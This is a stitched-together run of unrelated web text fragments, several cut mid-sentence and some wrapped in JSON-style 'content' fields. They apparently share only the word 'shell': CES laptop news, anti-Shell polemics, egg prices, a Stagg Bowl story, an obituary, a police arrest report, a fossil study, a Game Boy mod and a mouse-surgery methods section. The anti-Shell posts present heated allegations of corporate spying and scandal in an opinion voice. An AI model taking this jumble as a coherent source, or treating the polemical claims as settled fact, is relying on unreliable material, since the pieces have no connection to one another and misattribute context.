Swift Go 14 and Acer Swift Go 16 for their mix of thin-and-light designs, good display options and affordable pricing. The latest additions to these lines introduce AMD's latest Ryzen AI 300 Series CPUs and a new anodized aluminum chassis with a dual-arrow pattern. The Ryzen AI 7 350 features eight cores, 16 threads and a neural processing unit (for AI) clocked at 50 tera operations per second. The step-down Ryzen AI 7 340 has six cores and 12 threads. The thin design doesn't allow for a dedicated GPU so you're left with an option of integrated Radeon 860M or 840M graphics.\n\nThe display options look awesome. Both the 14- and 16-inch models give you a choice of a 2K or 3K OLED or a 2K IPS touchscreen.\n\nThe Swift Go 14 AI will be available in May starting at $900, and the Swift Go 16 AI will be available in April starting at $950.\n\nThe Acer Swift Go 14 AI is based on AMD Ryzen AI 300 Series CPUs. Acer\n\nRevo Box AI mini PC\n\nAcer also had some desktop PC announcements at CES. It introduced the Aspire S AI and Aspire C AI all-in-one series along with a new mini PC.\n\nFor the AIO lines, the Aspire S AI is the sleeker and more stylish of the two. Both are available with a 24- or 27-inch display. Aspire S AI models are based on Intel Core Ultra Series 2 CPUs, and the Aspire C AI models feature AMD Ryzen AI 300 Series processors.\n\nAcer's Revo Box mini PC is a Windows challenger to Apple's Mac Mini. Acer\n\nThe Revo Box looks like a nice Windows alternative to the Mac Mini. It's a mini PC that's just 5.2 by 5.2 inches and 1.7 inches tall, which makes it a hair larger than the Mac Mini M4, but not quite as tall.\n\nIt offers Intel Core Ultra Series 2 CPUs, up to 32GB of RAM and up to a 1TB solid-state drive. I wish you could pack it with a larger storage drive, but it has a second M.2 slot to add a second SSD. For ports, the Revo Box supplies DisplayPort, HDMI, USB 4, four USB-A, two 2.5Gbps Ethernet and a headphone jack. It also has an integrated fingerprint reader for easy and secure logins.\n\nAvailable in black or white, the Acer Revo Box AI is scheduled to start shipping in the second quarter of this year. Its starting price of $800 is a couple hundred more than the baseline Mac Mini M4.",

Yes, both Shell and BP were knee-deep in the operations of Hakluyt, a London-based private intelligence firm that targeted NGOs and \u201cperceived enemies.\u201d These aren\u2019t just allegations\u2014they\u2019re well-documented cases of corporate spying and manipulation. Environmental activists? Watch your backs.\n\nThe Reunification Fantasy\n\nProponents of a Shell-BP merger argue that this could stabilize both companies, offering BP a lifeline and Shell an even bigger platform for profit. But would this actually benefit anyone beyond the shareholders? Absolutely not. Let\u2019s not kid ourselves: combining two sin stocks doesn\u2019t create a virtuous company\u2014it creates a bigger monster.\n\nThis isn\u2019t about saving the planet, as their marketing teams would have you believe. This is about consolidating power, streamlining greenwashing efforts, and maximizing shareholder returns while continuing to wreak environmental and social havoc.\n\nThe Shadow of Scandal\n\nThe idea of these two giants joining forces also dredges up a long list of skeletons from their shared closet:\n\n\u2022The Al Yamamah oil-for-arms scandal: A murky deal that left a stench as foul as their refineries.\n\n\u2022The Lockerbie bomber release: Shell\u2019s fingerprints were allegedly on the letter drafted for Tony Blair to Libyan dictator Gaddafi, securing oil deals in exchange for Abdelbaset al-Megrahi\u2019s freedom.\n\nAnd yet, despite their history of scandals and catastrophic failures, Shell and BP still expect us to believe they\u2019re on the cutting edge of the \u201cgreen revolution.\u201d Give us a break.\n\nWhat the Actual F*ck, Shell and BP?\n\nA Shell-BP merger wouldn\u2019t just be bad news\u2014it would be a PR-fueled disaster wrapped in greed, hypocrisy, and a massive middle finger to anyone who cares about the environment, worker safety, or corporate accountability. But hey, maybe that\u2019s the point. After all, for Shell and BP, the game has never been about doing the right thing. It\u2019s about playing the long con while the world burns.\n\nSo here\u2019s to Shell and BP: the ultimate sin stocks, united in their quest to ruin lives and the planet, one oil spill and shady deal at a time. Reunification? Sure. But let\u2019s call it what it is: a marriage made in corporate hell.\n\n*Oliver Shah, author of an article about the prospects of a Shell BP merger published on page 6 of The Sunday Times Business & Money Section on 29 Dec 2024 under the headline: \u201cShare tips for 2025: our writers pick the stocks poised to soar\u201d\n\nShare this: Facebook\n\nTwitter\n\nEmail\n\nPrint\n\n\n\nLike this: Like Loading...\n\nThis website and sisters royaldutchshellgroup.com johndonovan.website , and shellnews.net , are owned by John Donovan .

            "content": "LOS ANGELES - California's egg prices have continued to rise due to ongoing outbreaks of the highly pathogenic avian influenza (HPAI) or bird flu, according to a latest report from the US Department of Agriculture (USDA).\n\nAccording to the report released Friday, the benchmark price for a dozen large shell eggs in the Golden State rose $0.78 to $8.97, while in Southern California, the wholesale price for a dozen jumbo eggs averaged $8.91 to $9.10.\n\nJumbo eggs are the largest size of chicken eggs as classified by the USDA, followed by extra large, large and medium in levels.\n\nMeanwhile, a weekly report issued by the USDA on Friday concluded that the nationwide egg price \"began to show some retreat from recent record-high levels, but the undertone remains firm.\"\n\nRecent wholesale price on the New York market for large cartoned shell eggs delivered to retailers rose $0.12 to $6.06 per dozen. The price was $3.13 in October, and $2.13 one year ago.\n\n\"The rate of shell egg demand held through the final weeks of 2024 -- despite record-high prices in many retail markets across the nation -- is driven by rising concerns about the limited availability of shell eggs at some grocery stores across the nation,\" the USDA weekly report said.\n\nThe USDA blamed the eggs' surging prices and supply concerns on \"persistent and significant outbreaks of the HPAI in commercial table egg layer flocks through December,\" which have led to the culling of millions of egg-laying hens.\n\nIn late December, the Centers for Disease Control and Prevention reported that 128,907,392 wild aquatic birds, commercial poultry, and \"backyard or hobbyist flocks\" were infected by bird flu in the United States, compared to 111,412,626 recorded on Dec 2. Bird flu infections have been reported in all 50 states of the country.",

Greg Fiume/NCAA Photos via Getty Images\n\nHouston knows how to host the biggest national championships in college athletics.\n\nNRG Stadium has hosted three Final Fours, including one of the most iconic finishes in college basketball history when Kris Jenkins nailed a buzzer-beating 3-pointer to win the 2016 national title, and last season's College Football Playoff National Championship.\n\nThe Bayou City will be hosting another national championship Sunday in the country's most popular sport. But it isn't drawing the eyeballs, visitors or economic impact of last season's title game or the Final Fours.\n\nAdvertisement Article continues below this ad\n\nThe Stagg Bowl, or NCAA Division III national championship, kicks off Sunday at Shell Energy Stadium between two undefeated, elite programs. North Central College from Illinois is in its fifth straight championship game while Mount Union out of Ohio is aiming to add a 14th national title to its record total.\n\n\"It's the Division III Super Bowl,\" said Randy Mann, the athletic director at Mary-Hardin Baylor. \"I know how everybody gets excited about Super Bowls. Well, this is ours.\"\n\nTEXAS REP: Stagg Bowl showdown at Shell Energy Stadium to have plenty of Texas representation\n\nWhy would Houston want to host the Stagg Bowl?\n\nGoing from hosting the CFP National Championship one year to the Stagg Bowl the next might seem like a surprising progression for a city such as Houston.\n\nAdvertisement Article continues below this ad\n\nBut John Coppins, senior director of events for Harris County\u2013Houston Sports Authority, said hosting such an event is part of the agency's strategy regarding college championships.\n\n\"We always have an interest and inclination to help host NCAA championships,\" said Coppins, who wasn't with the organization when it successfully won the rights to the 2024 Stagg Bowl. \"The NCAA is very supportive and appreciates when cities and counties are open to hosting a range of championships across all different divisions. As a part of an ongoing strategy, we're always working with our local universities and colleges to identify if there's an interest in hosting a particular championship and how we can help get involved.\"\n\nAny given year, the authority will throw its hat in the ring for \"at least two or three NCAA championships.\" It has led to unique opportunities, such as hosting both the Division II and Division III women's golf national championships at least twice in the previous decade.\n\nStill, the authority's bids don't always go its way. Coppins said the Sports Authority was recently approached about potentially filling in as an emergency host for the FCS National Championship Game for the next two seasons. The NCAA selected FirstBank Stadium, Vanderbilt's football field in Nashville, instead to host the game in 2026 and 2027.\n\nAdvertisement Article continues below this ad\n\nToyota Stadium in Frisco, the game's host since 2010, is undergoing renovations over the next few years.\n\nCoppins also said the organization bid on the Division I Women's Soccer College Cup during its most recent bid cycle but wasn't selected, and is interested in hosting a volleyball national championship in the future.\n\n\"We're evaluating, literally, every single championship across every division and every sport on an annual basis,\" Coppins said.\n\nA Division III Football Championship banner hangs on the stadium wall prior to the Division III Football National Championship game known as Stagg Bowl XLVIII between the North Central Cardinals and the Mary Hardin-Baylor Crusaders on December 17, 2021, at Tom Benson Hall of Fame Stadium in Canton, OH. Icon Sportswire/Icon Sportswire via Getty Images\n\nHouston's an outlier in Stagg Bowl history\n\nThe College Football Playoff National Championship took over the city last year. There was a large fan fest in the George R. Brown Convention Center; multiple concerts featuring stars such as Jack Harlow, 2 Chainz and Latto; events run by corporate sponsors; and other activities outside of the actual game.\n\nAdvertisement Article continues below this ad\n\nAbout 100,000 people came to Houston that weekend, according to estimates from the sports authority, with an economic impact of $150-200 million.\n\nThe authority's goals for the Stagg Bowl goals are a little different.\n\n\"If you're trying to be a city that prides itself on hosting major sporting events, you don't just host the big, big, big ones,\" Coppins said. \"You have to demonstrate that no matter what the game is, what the event is, you're going to turn out and provide a stellar experience for the people playing in the game and the fans coming in from out of town.\"\n\nThe Stagg Bowl has traditionally been played across the country, but always previously in smaller cities and dot-on-the-map towns.\n\nAdvertisement Article continues below this ad\n\nIt was first held in Phenix City, Alabama, in 1973. For 25 straight seasons starting in 1993, it was held exclusively in Salem, Virginia. The game has popped around to different cities in recent years such as Canton, Ohio and Annapolis, Maryland. Woodforest Bank Stadium in Shenandoah hosted in 2018 and 2019.\n\nThe Stagg Bowl isn\u2019t a bonanza for ticket sales like the FCS National Championship Game, which drew 19,512 fans for last year's game.\n\nThe largest attendance for a Stagg Bowl over the past decade was 6,816 in 2018 when Mary Hardin-Baylor beat Wisconsin\u2013Oshkosh in Shenandoah.\n\n\"The stands on our side were packed; they were filling over into the other side of the stands,\" said Mann, who noted the school was a little sad this year's team wasn't able to make it far enough to play in Houston. \"The environment was just incredible.\"\n\nHowever, the next year, with North Central and Wisconsin-Whitewater vying for the title, only 1,362 people attended.\n\nThe Houston downtown skyline is photographed Monday, Sept. 9, 2024 at Harris County Criminal Courthouse in Houston. Yi-Chin Lee/Staff photographer\n\nDifferent city, same game\n\nPlaying in a big city isn't the only different part of this year's Stagg Bowl. The championship will also be broadcast on ESPN in primetime on a Sunday, a high-profile television slot to showcase Division III athletics. It has been broadcast on a Friday night on ESPNU in recent seasons.\n\n\"For ESPN and NCAA to figure out how to put us on ESPN, it's phenomenal,\" North Central head coach Brad Spencer. \"It's gonna be great viewership, great exposure.\"\n\nThe difference between playing in a smaller city and playing in Houston could be felt right away for both teams. Mount Union and North Central both practiced Friday at UH's TDECU Stadium. Previous years would see the teams typically practicing either on the gameday field or a local high school field.\n\nIt extended into Friday night as the teams held the annual pre-game banquet at NRG Stadium.\n\nCOTTON BOWL NOTES: What to know about College Football Playoff semifinal matchup between Ohio State and Texas\n\n\"We've been all over the country for the Stagg Bowl the past three years, going to Virginia, Maryland and Ohio,\" said North Central star quarterback Luke Lehnen, the two-time Gagliardi Trophy honoree as the best player in DIII football. \"Going to Texas is cool.\"\n\nThe banquet, which was closed to the public, is the lone major event outside of the football game during the weekend. No fanfest or corporate events are surrounding the game, for which tickets are $20 and are all general admission seating. There, of course, will be tailgating.\n\nDespite the different scenery, the head coaches and players who talked to the Chronicle following Friday's practice said it, at most, felt a little different playing in Houston. But they didn't come to Southeast Texas to go sightseeing.\n\nMount Union and North Central came to win the Stagg Bowl.",

Bravo, Shell.\n\nShell Buys Back Its Own Stock While the World Burns\n\nIn a move that screams, \u201cWe care more about investors than the future of humanity,\u201d Shell announced on January 3, 2025, that it\u2019s buying back a massive chunk of its own shares. These purchases, managed by Citigroup Global Markets Limited (because of course), are part of Shell\u2019s ongoing commitment to rewarding its loyal shareholders\u2014like BlackRock and Vanguard, who must be cackling with delight at the thought of even more dividends rolling in.\n\nLet\u2019s unpack what this really means. Stock buybacks are a classic Wall Street ploy to inflate share prices and keep investors happy without actually doing anything meaningful\u2014like, you know, addressing the climate crisis Shell has spent decades accelerating. While the polar ice caps melt and millions suffer from extreme weather, Shell\u2019s top priority is\u2026wait for it\u2026\u201cshareholder value.\u201d Because who needs a livable planet when you can have a higher stock price\n\nDismantling EV Charging Infrastructure: Because Why Not?\n\nMeanwhile, Shell is busy unraveling its so-called green ambitions. First, it announced that Shell Sky, the software used by third-party EV charging stations, will be shut down by April 30. This is the same Shell Sky that was developed by Greenlots, a company Shell bought in 2019. But hey, maintaining software for the EV transition isn\u2019t as profitable as pumping oil, so screw it\u2014Shell would rather focus on its own charging network (and even that is more about PR than actual progress).\n\nAnd it gets better! Shell is also offloading its home and workplace EV charging business in Europe to Dutch company 50five, washing its hands of the very infrastructure it once touted as proof of its commitment to \u201ccleaner mobility.\u201d Translation: \u201cWe made a quick buck off this, but now it\u2019s too much work, so someone else can deal with it.\u201d\n\nAccording to Xifeng Wu, Shell\u2019s Senior VP of E-Mobility, the company is now laser-focused on \u201cpublic charging experiences.\u201d Sure, Wu. Because Shell\u2019s EV charging business was always about profits, not sustainability. It\u2019s like they\u2019re saying, \u201cWe\u2019ll keep pretending to care about clean energy as long as it doesn\u2019t cut into our dividends.\n\nLondon, You\u2019re Just Not Greedy Enough\n\nIf all of that weren\u2019t enough, Shell is also threatening to pack its bags and move its stock listing from London to New York. Why? Because apparently, \u00a3152 billion in valuation isn\u2019t enough for this FTSE 100 juggernaut. CEO Wael Sawan has given London until the end of 2025 to close the valuation gap with U.S. competitors like ExxonMobil and Chevron\u2014or else Shell will flee to Wall Street, where sin stocks like Shell are worshipped with even fewer questions asked.\n\nSawan even told Bloomberg that Shell is on a \u201csprint\u201d to cut costs and boost its valuation. And if London can\u2019t give them the corporate worship they demand? \u201cWe have to look at all options,\u201d Sawan said, practically licking his lips at the thought of deregulated American markets. Because nothing says \u201cenvironmental responsibility\u201d like joining forces with Wall Street.\n\nShell\u2019s Hypocrisy: A Masterclass in Greed\n\nHere\u2019s the kicker: Shell still wants you to believe it\u2019s a leader in the fight against climate change. Remember their rebranding of Greenlots and NewMotion into Shell Recharge Solutions? Remember their promises of \u201cenabling cleaner mobility at home, at work, and on the move\u201d? Fast forward to 2025, and those promises are crumbling faster than Shell\u2019s credibility. They\u2019re cutting back EV charging programs, offloading responsibilities, and making a beeline for more lucrative markets, all while executing stock buybacks to keep investors fat and happy.\n\nMeanwhile, Shell\u2019s biggest cheerleaders\u2014BlackRock and Vanguard\u2014are happy to keep funding this charade. They rake in profits while Shell keeps spinning its wheels, pretending to care about the environment while doubling down on profits-first capitalism.\n\nWhat the Actual F*ck, Shell?\n\nLet\u2019s not mince words: Shell is a master of greenwashing and greed. They\u2019re not sprinting toward a greener future\u2014they\u2019re sprinting toward more shareholder payouts and PR wins. Whether it\u2019s abandoning London, gutting EV programs, or throwing billions at stock buybacks, Shell\u2019s priorities are crystal clear. The planet? Secondary. Their public image? A thinly veiled marketing strategy. The shareholders? Always first.\n\nSo here\u2019s a thought: Instead of inflating your stock price and threatening to bail on London, how about you actually use your obscene wealth to invest in real, meaningful solutions to the climate crisis you helped create? But of course, that would require a shred of integrity\u2014and this is Shell we\u2019re talking about.\n\nShell\u2019s strategy boils down to one simple truth: They\u2019ll do anything for profit\u2014no matter who or what pays the price. Investors cheer, the planet burns, and Shell marches on. What a legacy.\n\nShare this: Facebook\n\nTwitter\n\nEmail\n\nPrint\n\n\n\nLike this: Like Loading...\n\nThis website and sisters royaldutchshellgroup.com johndonovan.website , and shellnews.net , are owned by John Donovan .

The video which serves as prima facie evidence to the hunting of a Schedule-I reptile is a blatant violation of the crucial Section 9 of WLPA.\n\nFurthermore, the person who shot the video is equally liable for the crime for encouraging the crime under Section 52 of WLPA. \u201cI have also attached screenshots with URL for convenience during the future investigations,\u201d he said.\n\nThe video was believed to have been shot in Odisha and the person involved seems to be an Odia. Such a video will surely encourage others to consume turtle meat in the state, Mallik said.\n\nIt is also a matter of concern that one person arrested by DFO-Bhadrak for posting snake handling videos and another couple arrested by DFO-Cuttack for monkey handling/feeding videos last year have again resorted to the same.\n\nThe sole purpose of posting wildlife handling/hunting videos in different social media is to garner more likes/views to get easy & illegal money from the social media companies, said Mallik.\n\nIt is also a matter of shame that many persons supposed to be arrested for posting snake handling videos on different social media platforms are now listed as \u2018Master Snake Rescuers\u2019 by the department. Understandably, the social media activities were not considered before selecting the rescuers.\n\n\u201cI, therefore, request your good office to take appropriate strict action against any person who hunts scheduled wildlife and uploads the videos in Odisha on different social media platforms,\u201d Mallik added.\n\nIt may be noted that turtle is protected as a Schedule-I reptile under the Indian Wildlife (Protection) Act, 1972 and hunting it is punishable by imprisonment for up to seven years or a fine of Rs one lakh or both.",

            "content": "Meghan Markle kickstarted the year by bringing her Instagram account back to life. Followed by a playful beach video, Markle dropped a teaser trailer for her new Netflix series, With Love, Meghan\u2014which, obviously, I had to dissect.\n\nA closer look revealed heartfelt moments, including shots of her cooking and hosting, as well as a handful of easter eggs sprinkled in\u2014like Princess Diana\u2019s watch and some PDA. But my fashion editor eye didn\u2019t skip over the Duchess\u2019s effortless wardrobe, which included the trusty mall brand she\u2019s worn for years: J.Crew.\n\nJ.Crew Factory Sweater Shell\n\nJ.Crew\n\nThe first clip shows Markle beaming at the camera, wearing a cream sweater shell (which she sported in navy to the 2023 Invictus Games) from none other than J.Crew. Of course, the cozy cashmere top has already sold out, but I found a few notable lookalikes, starting at $20. The best part? The style couldn\u2019t be more versatile\u2014layer it, wear it with pants or a skirt\u2026the list goes on. After all, \"We're not in the pursuit of perfection. We're in the pursuit of joy,\u201d as the Duchess said in the teaser video.\n\nMeghan Markle-Inspired Sweaters:\n\nJ.Crew Featherweight Cashmere-Blend Cropped Sweater Shell\n\nJ.Crew\n\nIt\u2019s like J.Crew anticipated the sellout, so the brand offered a very similar cropped version. This sweater top boasts the same scoop neck but is made of a lightweight cashmere blend. Delicate ribbing, a back button, and keyhole closure add the perfect amount of detail. While white gets your Markle's look, it's also available in five other colors, a handful of which are on sale right now.\n\nMadewell Seneca Cotton Boucle Tank\n\nZappos\n\nGet a bit cozier with Madewell\u2019s Cotton Boucle Tank. The textured top mimics Markle\u2019s almost to a T, but offers a snuggly knit construction. It makes for a great layering piece, as well; add a fitted, long-sleeve underneath for a look with dimension.\n\nAnrabess Knit Pullover Sweater Top\n\nAmazon\n\nIf you run cold, consider snagging an option with a higher neckline, like the Anrabess Pullover Top. Not only is it just $20, but it includes stretchy material and cut-off sleeves. It\u2019s available in tons of Markle-approved neutral hues, so take your pick from apricot, khaki, camel, and white.\n\n",

The deal involves Shell Deutschland GmbH and Shell Overseas Investments B.V. acquiring 100 percent equity in Raj Petro, aiming to enhance operational efficiency and improve customer offerings.\n\nDetails of the Acquisition\n\nShell Deutschland GmbH (Acquirer 1) and Shell Overseas Investments B.V. (Acquirer 2), both subsidiaries of the Shell Group, have filed for regulatory clearance under the CCI\u2019s combination regulations. The acquisition will bring Raj Petro under the Shell umbrella, leveraging its expertise in hydrocarbon-based speciality products to complement Shell\u2019s expansive global portfolio.\n\nAbout the Parties\n\nShell Group operates across 70 countries, specializing in oil and gas exploration, renewable energy, and the manufacturing of high-performance lubricants. In India, it serves industries ranging from automotive to industrial manufacturing.\n\nRaj Petro Specialities is a leading manufacturer of petro-speciality products, including lubricants for sectors such as pharmaceuticals, energy, and agriculture. Its portfolio includes products like transformer oils, hydraulic oils, and industrial greases, catering to both domestic and international markets.\n\nMarket Implications\n\nThe proposed deal reflects horizontal overlaps in the lubricant sector, with the parties operating in markets like motor oils, industrial greases, and transformer oils. The CCI has been provided alternate definitions for relevant markets to facilitate its assessment. These include broad categories such as the overall lubricants market in India and narrower segments like passenger car motor oils and rubber process oils.\n\nAdditionally, a potential vertical overlap exists concerning the supply of base oils\u2014a key raw material for lubricants. Shell, a global producer of base oils, supplies these to its subsidiaries and competitors in India, while Raj Petro uses them for blending finished products.\n\nParties\u2019 Submission\n\nThe parties contend that the combination poses no competition concerns and have requested that the definition of the relevant market be left open. They argue that the deal will not adversely impact competition but instead foster efficiencies and better product offerings.\n\nNext Steps\n\nThe CCI\u2019s nod is pivotal for the deal, as it will set a precedent for how global giants expand their footprint in the Indian petrochemical and lubricant markets. If approved, the acquisition could enhance market competitiveness while providing a broader product range for Indian consumers.\n\nThe Shell-Raj Petro deal represents a strategic move in India\u2019s evolving energy and petrochemical landscape. The CCI\u2019s decision will play a critical role in shaping the future of the sector and determining how global and domestic players coexist in this competitive market, economy watchers said.",

            "content": "Colton \u201cColty\u201d James Shell was born on March 31, 2008, in Waynesville, NC. He left his earthly body on January 3, 2025, freed from all his pain and medical complications. Colty was known for his contagious smile, thunderous laughter, and an insatiable desire to connect with and help others. He loved participating in the Special Olympics, hip-hop dancing at Legacy, and performing with the Tuscola High School Marching Mountaineer Band. Every summer, he could often be found by the pool and boats at Lake Junaluska. Music was his passion; he always had a headphone in one ear and enjoyed playing his drums daily.\n\nFamily was incredibly important to Colty \u2013 he loved talking with them, asking questions, and telling stories. He was always excited about participating in family activities. Though he and his older sister, Emma, had typical sibling rivalries and conflicts, Colty always looked up to her and found solace in her company. She helped him navigate his complex medical issues and his desire to just be a regular teenage kid.\n\nHe looked forward to seeing his friends at school and often would come back excited to tell a story about what had happened that day. He never met a stranger and was kind to everyone. Colton lived a fulfilling life with the help and guidance of his medical team, including his many beloved and devoted home health nurses, especially Adam and Emily, who have been part of his home team the longest. We are so incredibly grateful to all of his doctors and care providers who worked tirelessly to provide the best possible life for Colty. The family also sends their heartfelt thanks to the community for welcoming and embracing him.\n\nEven now, Colty continues to give to others, as he was able to donate several organs to patients on the transplant list. As a donor, he was celebrated with an Honor Walk at Greenville Memorial, where family, friends, and others that knew Colty and his family, lined the halls between his room and the operating room. It was the largest gathering for an Honor Walk that the hospital\u2019s staff had seen.\n\nHe is survived by his parents, Matt and Lucy Shell, and his sister, Emma; his maternal grandparents, Ed and Linda McFarland, and his paternal grandparents, Jim and Carol Shell - all from Waynesville, NC; his maternal uncle and aunt, Duncan and Jackie McFarland, and cousin, Chloe - from Lexington, KY; paternal uncle and aunt, Chris and Paige Shell, and cousins, Zane Shell, and Jessi and Hunter Chambers - from Waynesville, NC; his maternal step-great-grandmother, Virginia Dick - from Virginia Beach, VA; and his many cherished relatives who cared about him dearly.\n\nThe service will be held on January 22nd, 2025, at 4:00 pm in the Sanctuary at First United Methodist Church, 566 S. Haywood St. in Waynesville. Visitation will follow in the Fellowship Hall.\n\nIn lieu of flowers, the family is asking for donations to two organizations that he was passionate about, Haywood County Special Olympics 1233 N Main St., Waynesville NC 28786 or Tuscola High School Marching Band 564 Tuscola School Rd., Waynesville, NC 28786 (please put Colton Shell\u2019s name in the memo line)\n\nThe family would like to express our gratitude and sincere appreciation to everyone who has loved, cared, and played a vital role in Colty\u2019s life. They truly adore all the friendships that have been made in his 16 years of life.\n\nThe care of Colty has been entrusted to Wells Funeral Home of Waynesville",

Maryland State Police Troopers Oyler and Abdel Wahab responded to reports of a suspicious vehicle at Maryland Route 235 and Pegg Road. What began as a routine check quickly escalated into a multi-faceted investigation.\n\nUpon arrival, troopers observed a dark blue Chevrolet Equinox idling near the air pump. The rear passengers\u2019 abrupt movements and the driver\u2019s erratic behavior immediately drew the officers\u2019 attention. The driver, identified as Melissa Dudley, stumbled as she exited the vehicle, and officers noted signs of impairment, including slurred speech, glassy eyes, and the odor of alcohol. Dudley\u2019s inconsistent movements between the front and passenger seats while retrieving her driver\u2019s license further raised suspicion.\n\nA search of the vehicle uncovered CDS smoking devices, copper wool commonly used as a filter for drug paraphernalia, and three white hard rocks suspected to be crack cocaine. While officers were conducting the search, passenger Michael Lawrence Nelson fled the scene on foot but was apprehended in a nearby parking lot. Two other passengers, Thomas Edward Dalton Jr. and Kristen Lauren Stoneman, were detained without incident. Stoneman initially provided a false identity but was later identified as Tabitha Marie Wilson, who had an active warrant in Calvert County for CDS distribution.\n\nAdditional contraband was recovered during Nelson\u2019s arrest, including suspected powder cocaine, suspected crack cocaine, and brass knuckles concealed on his person. Wilson\u2019s attempt to provide a false identity compounded her charges, given her fugitive status. Dalton, meanwhile, was observed consuming alcohol inside the vehicle.\n\nAll four individuals were transported to the St. Mary\u2019s County Detention Center. Court records show Melissa Dudley was charged with driving under the influence, reckless and negligent driving, CDS possession, and possession of drug paraphernalia. She was released on a $1,500 unsecured personal bond and is scheduled for trial on February 10, 2025, in St. Mary\u2019s District Court before Judge Tanavage. Thomas Dalton, charged with CDS possession and possession of drug paraphernalia, was released on his own recognizance. His trial is set for February 6, 2025, before Judge Raley. Tabitha Marie Wilson, charged with CDS possession, possession of drug paraphernalia, and providing false information to a peace officer, remains held without bond. She is scheduled for trial on February 10, 2025, also before Judge Tanavage.\n\nUnder Maryland law, possession of CDS carries potential penalties of up to four years in prison and fines of up to $25,000, depending on the substance and quantity. Weapons violations, false statements to law enforcement, and DUI charges add significant legal weight for those involved.\n\nContact our news desk at news@thebaynet.com",

Scale bars represent 200 micrometers. Credit: R. Bicknell, et al (2025) Current Biology\n\nA study led by researchers at the American Museum of Natural History presents the oldest known example in the fossil record of an evolutionary arms race. These 517-million-year-old predator-prey interactions occurred in the ocean covering what is now South Australia between a small, shelled animal distantly related to brachiopods and an unknown marine animal capable of piercing its shell.\n\nDescribed in the journal Current Biology, the study provides the first demonstrable record of an evolutionary arms race in the Cambrian.\n\n\"Predator-prey interactions are often touted as a major driver of the Cambrian explosion, especially with regard to the rapid increase in diversity and abundance of biomineralizing organisms at this time. Yet, there has been a paucity of empirical evidence showing that prey directly responded to predation, and vice versa,\" said Russell Bicknell, a postdoctoral researcher in the Museum's Division of Paleontology and lead author of the study.\n\nAn evolutionary arms race is a process where predators and prey continuously adapt and evolve in response to each other. This dynamic is often described as an arms race because one species' improved abilities lead to the other species improving its abilities in response.\n\nBicknell and colleagues from the University of New England and Macquarie University\u2014both in Australia\u2014studied a large sample of fossilized shells of an early Cambrian tommotiid species, Lapworthella fasciculata, from South Australia.\n\nMore than 200 of these extremely small specimens, ranging in size from slightly larger than a grain of sand to just smaller than an apple seed, have holes that were likely made by a hole-punching predator\u2014most likely a kind of soft-bodied mollusk or worm.\n\nThe researchers analyzed these specimens in relation to their geologic ages, finding an increase in shell wall thickness that coincides with an increase in the number of perforated shells in a short amount of time. This suggests that a microevolutionary arms race was in place, with L. fasciculata finding a way to fortify its shell against predation and the predator, in turn, investing in the ability to puncture its prey despite its ever-bulkier armor.\n\n\"This critically important evolutionary record demonstrates, for the first time, that predation played a pivotal role in the proliferation of early animal ecosystems and shows the rapid speed at which such phenotypic modifications arose during the Cambrian Explosion event,\" Bicknell says.\n\nMore information: Adaptive responses in Cambrian predator and prey highlight the arms race during the rise of animals, Current Biology (2025).

            "content": "While modern gaming systems deliver ever more realistic experiences, there\u2019s still something to be said for the consoles and handhelds of the 80s and 90s. For many, the appeal is nostalgic. Others are attracted to the \u201clo-fi\u201d graphical and sound design of these games, necessitated by the limited hardware of the time.\n\nThat said nobody would claim those old systems were perfect. Which is why a hybrid approach like [Peter Khouly] has been working on with the Pico Pal might be the ultimate solution. This replacement motherboard for the Game Boy Color (GBC) is powered by the RP2350, meaning the external hardware will have the same look and feel as it did back in 1998, but you\u2019ll still be able to reap the benefits of modern emulation.\n\nWhile the origins of the project go a bit farther, [Peter] has been working on this particular variation of the Pico Pal GBC since August, and has kept a fascinating log of his progress. Just getting the RP2350 to emulate Pok\u00e9mon isn\u2019t really that big of a deal, but getting all the ancillary hardware implemented and fitted inside the case of the GBC is a different story. Especially since [Peter] intends to pack plenty of features into the final product, such as rechargable batteries, Bluetooth audio, real-time clock support, and digital video out.\n\nThe most recent status update is from just last week, where [Peter] goes over some of the new features he\u2019s been working on. A major one is the soft power solution, where the physical power switch doesn\u2019t just pull the plug like it did back in the 1990s. Instead, the switch triggers the board to save the game and enter into a low-power mode so that it can come right back on to where you left off. This does impact battery life, but so far, it looks like the Pico Pal GBC will be able to run for at least five hours on a charge, and more than twice that if you don\u2019t mind turning off the audio.\n\nIt sounds like there\u2019s still several gremlins to track down in the design, but even in its current state, the Pico Pal GBC looks very interesting. We\u2019re immediately reminded of the phenomenal work [Bucket Mouse] has put in on a similar refit for the original DMG-1 Game Boy.",

All animals were maintained under standard laboratory conditions: an artificial 12 h light/dark cycle with lights on from 8 am to 8 pm; with an ambient temperature of 21 \u00b1 1 \u00b0C and a relative humidity of 50\u201360%. Mice were housed in type 2L home cages with a maximum of 6 mice per cage, with food (standard diet 4RF21, Mucedola, Italy) and water ad libitum, unless stated otherwise. After surgery, animals were maintained in pairs, without physical access to one another (using a cage divider) to avoid damaging of the implants.\n\nBehavioral experiments were performed during the light period of the light/dark cycle. Handling was performed for 10 minutes a day, starting at least one week before behavioral experiments. Animals were habituated to behavioral apparatuses for 3 consecutive days for 15 min before the behavioral tasks. Sample size used in behavioral tests was chosen according to previous studies; the investigator was not blind to the group allocation during behavioral performance, but it was blind in data analysis.\n\nAll procedures involving mice were performed according to the guidelines for the welfare of laboratory mice as described in the European Union Directive 2010/63/EU. All protocols were approved by the Ethics Committee of the Life and Health Sciences Research Institute (ICVS) and by the national authority for animal experimentation, Dire\u00e7\u00e3o-Geral de Alimenta\u00e7\u00e3o e Veterin\u00e1ria (DGAV; approval reference #8332). Health monitoring was carried out according to FELASA guidelines and all experimenters and animal facilities are accredited by DGAV.\n\nSurgeries\n\nSurgeries were performed under sterile conditions and sevoflurane (2\u20133%, plus oxygen at 1\u20131.5 l/min) anesthesia on a stereotactic frame (David Kopf Instruments, Model 940). Throughout each surgery, mouse body temperature was maintained at 36 \u00b0C using an animal temperature controller (ATC2000, World Precision Instruments) and afterward, each mouse was allowed to recover from the anesthesia in its homecage under a heating lamp. The mouse head was shaved, cleaned with 70% alcohol and a small incision from anterior to posterior was made on the skin to allow for aligning the head and drilling the hole for the injection site.\n\nImaging\n\nEach animal was unilaterally injected with 400 nl of AAV5-CAG-Flex-GCaMP6f-WPRE-SV40 (Addgene) into the right NAc (AP: 1.45 mm, ML: 0.6 mm, DV: 4.5 mm) using a Nanojet III Injector (Drummond Scientific, USA) at a rate of 1 nl per second. The injection pipette was left in place for 10 min post-injection before it was removed. After the injection, a 0.6-mm-diameter gradient index (GRIN) lens with a baseplate attached (Inscopix) was slowly lowered into the right mouse NAc 